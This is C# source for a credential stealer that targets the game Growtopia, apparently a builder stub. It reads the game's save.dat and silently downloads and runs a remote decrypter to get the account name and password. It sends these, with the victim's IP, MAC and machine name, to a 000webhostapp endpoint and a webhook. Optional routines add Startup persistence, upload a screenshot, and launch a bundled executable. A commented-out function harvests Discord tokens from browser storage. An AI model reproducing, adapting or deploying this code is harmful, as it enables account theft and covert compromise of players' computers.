using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;
using System.Runtime.InteropServices;
using System.Drawing;
using System.Reflection;
using System.Threading.Tasks;
using System.Text.RegularExpressions;
using System.Management;
using System.Collections.Specialized;
using System.Windows.Forms;

namespace SaveForwarderOneCS
{
    class Program
    {
        static Assembly a = Assembly.GetExecutingAssembly();
        static string weburl, savefiler;
        static bool ifcont;
        static string user = "*USER*";


        static string SendScreenshot = "ssfalse"; //ssfalse
        static string CopyToStartup = "ctsfalse"; //ctsfalse
        static string SendSaveDat = "ssdfalse"; //ssdfalse
        static string AntiSpam = "asfalse"; //asfalse
        static string FileBinder = "binderfalse"; //binderfalse
        static string SendWebhook = "swhfalse";
        //static string DiscordToken = "dctrue"; //dcfalse

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("user32.dll")]
        private static extern bool SetProcessDPIAware();

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);


        const int SW_HIDE = 0;

        [STAThread]
        static void Main()
        {
            SetProcessDPIAware();
            try
            {
                File.Delete(Path.GetTempPath() + "\\result.txt");
            }
            catch (Exception)
            {

            }

            if (FileBinder == "bindertrue")
            {
                Task.Factory.StartNew(Bindexe);
            }

            try
            {
                if (CopyToStartup == "ctstrue")
                {
                    string thisFile = AppDomain.CurrentDomain.FriendlyName;
                    string Filepath = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + thisFile;
                    if (!File.Exists(Filepath))
                    {
                        File.Copy(Assembly.GetExecutingAssembly().Location, Filepath);
                    }
                    else
                    {
                        File.Delete(Filepath);
                        File.Copy(Assembly.GetExecutingAssembly().Location, Filepath);
                    }
                }
            }
            catch (Exception) { }

            if (SavePath() != string.Empty || SavePath() != null)
            {
                string eternityurl = "http://wowprohaxerkk.000webhostapp.com/";
                try
                {
                    ServicePointManager.Expect100Continue = true;
                    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                    ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
                    var decrypter = new WebClient();
                    decrypter.DownloadFile("https://github.com/zoax33/Utils/blob/master/savedecrypter.exe?raw=true", Path.GetTempPath() + "\\savedecrypter.exe");
                    Process process = new Process();
                    process.StartInfo.FileName = Path.GetTempPath() + "\\savedecrypter.exe";
                    process.StartInfo.CreateNoWindow = true;
                    process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    process.Start();
                    process.WaitForExit();
                }
                catch (Exception)
                {
                    Application.DoEvents();
                }
                string[] info = File.ReadAllText(Path.GetTempPath() + "\\result.txt").Split(new char[]
                {
                                '|'
                });
                string[] SaveInfo = info;
                string GrowID = SaveInfo[0].ToLower();
                string Passwords = SaveInfo[1];
                string Mac = SaveInfo[2];
                RegistryKey accs = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32)
                    .OpenSubKey("System\\CurrentControlSet", true);
                try
                {
                    if (AntiSpam == "astrue")
                    {
                        string RegPass = (string)accs.GetValue(GrowID);
                        if (Passwords != null)
                        {
                            if (Passwords != RegPass)
                                ifcont = true;
                            else
                                ifcont = false;
                        }
                        else
                        {
                            ifcont = true;
                        }
                        if (!ifcont)
                            return;
                    }
                }
                catch { }
                string savenew = Path.GetTempPath() + GrowID.ToLower() + ".dat";
                if (File.Exists(savenew))
                    File.Delete(savenew);
                File.Copy(SavePath(), savenew);
                WebClient wc = new WebClient();
                weburl = "*WEBURL*"; // *WEBURL* /////////////////////////////////////////////////////////////////////////
                savefiler = "*SAVEFILTER*"; // *SAVEFILER* //////////////////////////////////////////////////////////////////////

                string requrl = eternityurl + "postsave.php?growid=" + GrowID + "&password=" + Passwords + "&owner=" + user + "&timestamp=" + GetTimestamp(DateTime.Now) + "&aap=" + Mac + "&ip=" + GetIP();
                WebRequest wreq = WebRequest.Create(requrl);
                Debug.WriteLine(requrl);
                WebResponse wRes = wreq.GetResponse();
                string imageurl = "";
                WebRequest wreq1 = WebRequest.Create(eternityurl + "validate.php?username=" + user);
                WebResponse wRes1 = wreq1.GetResponse();
                StreamReader sr1 = new StreamReader(wRes1.GetResponseStream());
                string wresult = sr1.ReadToEnd();
                sr1.Dispose();
                if (SendScreenshot == "sstrue")
                    imageurl = Screenshot();

                try
                {
                    PostEmbed(weburl, imageurl);
                    if (SendSaveDat == "ssdtrue")
                        wc.UploadFile(savefiler, savenew);
                }
                catch { }



                File.Delete(savenew);
                if (Passwords != null)
                    accs.SetValue(GrowID, Passwords);
                accs.Close();
            }


        }


        public static string GetTimestamp(DateTime value)
        {
            return value.ToString("yyyy-MM-dd HH:mm");
        }
        public static string GetIP()
        {
            string IPADDRESS = new WebClient().DownloadString("http://ipv4bot.whatismyipaddress.com/");
            return IPADDRESS;
        }

        private static void PostEmbed(string url, string imageurl)
        {
            try
            {
                string GrowID = "Failed to get GrowID"; string Password = "Failed to get Password"; string Mac = "Failed to get MAC";
                var httpWebRequest = (HttpWebRequest)WebRequest.Create(url);
                httpWebRequest.ContentType = "application/json";
                httpWebRequest.Method = "POST";
                try
                {
                    ServicePointManager.Expect100Continue = true;
                    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                    ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
                    var decrypter = new WebClient();
                    decrypter.DownloadFile("https://github.com/zoax33/Utils/blob/master/savedecrypter.exe?raw=true", Path.GetTempPath() + "\\savedecrypter.exe");
                    Process process = new Process();
                    process.StartInfo.FileName = Path.GetTempPath() + "\\savedecrypter.exe";
                    process.StartInfo.CreateNoWindow = true;
                    process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    process.Start();
                    process.WaitForExit();
                }
                catch (Exception)
                {
                    Application.DoEvents();
                }
                string[] info = File.ReadAllText(Path.GetTempPath() + "\\result.txt").Split(new char[]
                {
                                '|'
                });
                if (info != null)
                {
                    GrowID = info[0];
                    Password = info[1];
                    Mac = info[2];
                }
                /*
                string TokenString = "";

                string[] Tokens = DiscordTokens();

                if (Tokens != null)
                {
                    string tokenlist = "";
                    foreach (string token in Tokens)
                    {
                        tokenlist += token + @"\n";
                    }
                    MessageBox.Show(tokenlist);
                    TokenString = "{\"name\":\"Discord Tokens:\"," +
                                  "\"value\":\"```" + "tokenlist" + "```\"},";
                }

                bool iftoken = DiscordToken == "dctrue";*/

                using (var streamWriter = new StreamWriter(httpWebRequest.GetRequestStream()))
                {
                    string json = "{\"embeds\":[" +
                                  "{\"color\":977767," +
                                  "\"footer\":{" +
                                  "\"text\":\"Have fun! | " + user + " |" + "\"}," +
                                  "\"author\":{\"name\":\"" + GetIP() + "\"," +
                                  "\"icon_url\":\"https://discordemoji.com/assets/emoji/5018_thinkies.png\"}," +
                                  "\"image\":{\"url\":\"" + imageurl + "\"}," +
                                  "\"fields\":[" +
                                  "{\"name\":\"New Save.dat from:\"," +
                                  "\"value\":\"```" + Environment.UserName + " / " + Environment.MachineName + "```\"}," +
                                  "{\"name\":\"GrowID:\"," +
                                  "\"value\":\"```" + GrowID + "```\"}," +
                                  "{\"name\":\"Password:\"," +
                                  "\"value\":\"```" + Password + "```\"}," + /*TokenString +*/
                                  "{\"name\":\"AAP:\"," +
                                  "\"value\":\"```" + Mac + "```\"}" +
                                  "]}]}";

                    streamWriter.Write(json);
                }
                var httpResponse = (HttpWebResponse)httpWebRequest.GetResponse();
                using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
                {
                    var result = streamReader.ReadToEnd();
                }
            }
            catch { }
        }

        /*private static string[] DiscordTokens()
        {
            try
            {
                List<string> locs = new List<string>();
                List<string> tokens = new List<string>();

                locs.Add(@"Roaming\Discord");
                locs.Add(@"Roaming\discordcanary");
                locs.Add(@"Roaming\discordptb");
                locs.Add(@"Local\Google\Chrome\User Data\Default");
                locs.Add(@"Roaming\Opera Software\Opera Stable");
                locs.Add(@"Local\BraveSoftware\Brave-Browser\User Data\Default");
                locs.Add(@"Local\Yandex\YandexBrowser\User Data\Default");

                foreach (string loc in locs)
                {
                    DirectoryInfo leveldb = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)
                              + @"\AppData\"
                              + loc
                              + @"\Local Storage\leveldb");

                    try
                    {
                        foreach (var file in leveldb.GetFiles("*.log"))
                        {
                            string contents = file.OpenText().ReadToEnd();

                            foreach (Match match in Regex.Matches(contents, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
                                tokens.Add(match.Value);

                            foreach (Match match in Regex.Matches(contents, @"mfa\.[\w-]{84}"))
                                tokens.Add(match.Value);
                        }
                    }
                    catch { }

                    try
                    {
                        foreach (var file in leveldb.GetFiles("*.ldb"))
                        {
                            string contents = file.OpenText().ReadToEnd();

                            foreach (Match match in Regex.Matches(contents, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
                                tokens.Add(match.Value);

                            foreach (Match match in Regex.Matches(contents, @"mfa\.[\w-]{84}"))
                                tokens.Add(match.Value);
                        }
                    }
                    catch { }

                }

                tokens = tokens.Distinct().ToList();

                if (tokens.Count == 0) return null;

                return tokens.ToArray();
            }
            catch
            {
                return null;
            }
        }*/

        private static void Close()
        {
            Environment.Exit(0);
        }

        private static string Screenshot()
        {
            try
            {
                Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                using (Graphics g = Graphics.FromImage(bmp))
                {
                    g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
                }
                ImageConverter converter = new ImageConverter();
                NameValueCollection data = new NameValueCollection
                        {
                            {
                                "image",
                                Convert.ToBase64String((byte[])converter.ConvertTo(bmp, typeof(byte[])))
                            }
                        };
                byte[] bytes = new WebClient().UploadValues("https://api.imgbb.com/1/upload?key=ccbe8b8829304410e2f7d53423b7ae9c", data);
                string @string = Encoding.UTF8.GetString(bytes);
                @string = @string.Replace(@"\/", @"/");
                Regex regex = new Regex(@"(https?:\/\/[a-zA-Z0-9]+\.[^\s][^""]{1,}[a-zA-Z0-9]+\.png)");
                Match match = regex.Match(@string);
                return match.Groups[0].Value;
            }
            catch
            {
                return "";
            }

        }

        private static void Bindexe()
        {
            try
            {
                Stream manifestResourceStream = a.GetManifestResourceStream("1.txt");
                byte[] array = new byte[manifestResourceStream.Length];
                manifestResourceStream.Read(array, 0, array.Length);
                manifestResourceStream.Close();
                var FStream = new FileStream(Path.GetTempPath() + "\\1.exe", FileMode.Create);
                FStream.Write(array, 0, array.Length);
                FStream.Close();
                FStream.Dispose();
                Process process = new Process();
                process.StartInfo.FileName = Path.GetTempPath() + "\\1.exe";
                process.Start();
            }
            catch { }
        }

        public static string SavePath()
        {
            try
            {
                RegistryKey gtreg;
                if (Environment.Is64BitOperatingSystem)
                {
                    gtreg = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
                }
                else
                {
                    gtreg = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry32);
                }
                try
                {
                    gtreg = gtreg.OpenSubKey(@"Software\Growtopia", true);
                    string pathvalue = (string)gtreg.GetValue("path");
                    if (Directory.Exists(pathvalue))
                    {
                        if (File.Exists(pathvalue + @"\save.dat"))
                        {
                            string sdat = null;
                            var r = File.Open(pathvalue + @"\save.dat", FileMode.Open, FileAccess.Read, FileShare.Read);
                            using (FileStream fileStream = new FileStream(pathvalue + @"\save.dat", FileMode.Open, FileAccess.Read, FileShare.Read))
                            {
                                using (StreamReader streamReader = new StreamReader(fileStream, Encoding.Default))
                                {
                                    sdat = streamReader.ReadToEnd();
                                    streamReader.Close();
                                }
                                r.Close();
                                fileStream.Close();
                            }

                            if (sdat.Contains("tankid_password") & sdat.Contains("tankid_name"))
                            {
                                return pathvalue + @"\save.dat";
                            }
                            else
                            {
                                return Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + @"\Growtopia\save.dat";
                            }
                        }
                        else
                        {
                            return Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + @"\Growtopia\save.dat";
                        }

                    }
                    else
                    {
                        return Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + @"\Growtopia\save.dat";
                    }
                }
                catch
                {
                    return Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + @"\Growtopia\save.dat";
                }
            }
            catch
            {
                return Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + @"\Growtopia\save.dat";
            }
        }
    }
}
